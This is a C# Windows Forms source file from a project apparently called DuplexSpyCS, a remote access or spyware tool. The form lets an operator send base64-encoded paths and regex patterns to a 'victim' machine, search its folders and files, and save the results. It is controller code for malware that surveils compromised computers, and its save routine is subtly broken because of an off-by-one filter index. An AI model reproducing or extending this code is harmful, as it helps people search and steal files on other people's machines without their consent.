using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileFind : Form
    {
        public clsVictim v;
        public string currentPath; //Directory

        public frmFileFind()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Show discovered folders and files.
        /// </summary>
        /// <param name="lsFolder"></param>
        /// <param name="lsFile"></param>
        public void ShowFindResult(List<(string, string, string)> lsFolder, List<(string, string, string)> lsFile)
        {
            List<(string, string, string)> results = new List<(string, string, string)>();
            results.AddRange(lsFolder);
            results.AddRange(lsFile);

            Invoke(new Action(() => toolStripProgressBar1.Maximum = results.Count));

            foreach (var x in results)
            {
                ListViewItem item = new ListViewItem(x.Item1);
                item.SubItems.Add(x.Item2);
                item.SubItems.Add(x.Item3);

                Invoke(new Action(() =>
                {
                    listView1.Items.Add(item);
                    toolStripProgressBar1.Increment(1);
                }));
            }

            Invoke(new Action(() => toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}], File[{lsFile.Count}]"));
        }

        void setup()
        {
            textBox1.Text = currentPath;
            textBox2.Text = "RegexPattern.txt";

            toolStripStatusLabel1.Text = string.Empty;
        }

        private void frmFileFind_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Send "find" command.
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            toolStripProgressBar1.Value = 0;

            int method = 0; //0: Name only, 1: FullPath
            int ignoreCase = 1; //0: False, 1: True
            int itemType = 2; //0: Folder, 1: File, 2: All

            string[] paths = textBox1.Lines.Where(x => !string.Equals(x.Trim(), Environment.NewLine)).ToArray();
            string[] patterns = textBox2.Lines.Where(x => !string.Equals(x.Trim(), Environment.NewLine)).ToArray();

            new Thread(() =>
            {
                string b64Paths = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());
                string b64Patterns = string.Join(",", patterns.Select(x => clsCrypto.b64E2Str(x)).ToArray());

                v.SendCommand($"file|find|{b64Paths}|{b64Patterns}|{method}|{ignoreCase}|{itemType}");
            }).Start();
        }

        //Save Result
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            List<(string, string, string)> lsDatas = listView1.Items.Cast<ListViewItem>().Select(x => (x.Text, x.SubItems[1].Text, x.SubItems[2].Text)).ToList();

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Text File(*.txt)|*.txt|CSV File(*.csv)|*.csv|HTML File(*.html)|*.html";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                int dwFilterIndex = sfd.FilterIndex;
                switch (dwFilterIndex)
                {
                    case 0: //txt
                        File.WriteAllText(
                            sfd.FileName, //File Path

                            //File Content
                            "# Find result:\n" +
                            string.Join(Environment.NewLine, lsDatas.Select(x => $"{x.Item1},{x.Item2},{x.Item3}").ToArray())
                        );
                        break;
                    case 1: //csv
                        File.WriteAllText(
                            sfd.FileName, //File Path

                            //File Content
                            "Name,Type,Path\n" +
                            string.Join(Environment.NewLine, lsDatas.Select(x => $"{x.Item1},{x.Item2},{x.Item3}").ToArray())
                        );
                        break;
                    case 2: //html
                        string txtHTML = File.ReadAllText("config\\SaveHTML.txt");
                        string[] arrColumns = new string[] { "Name", "Type", "Path" };
                        string szColumns = string.Join(Environment.NewLine, arrColumns.Select(x => $"<th>{x}</th>").ToArray());
                        string szDatas = string.Join(Environment.NewLine, lsDatas.Select(x => $"<td>{x.Item1}</td>\n<td>{x.Item2}</td>\n<td>{x.Item3}</td>\n").Select(x => $"<tr>{x}</tr>\n").ToArray());

                        File.WriteAllText(
                            sfd.FileName,

                            //File Content
                            txtHTML.Replace("[COLUMNS]", szColumns).Replace("[DATAS]", szDatas)
                        );
                        break;
                }
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting();

            f.ShowDialog();
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\FileFind").Show();
        }
    }
}
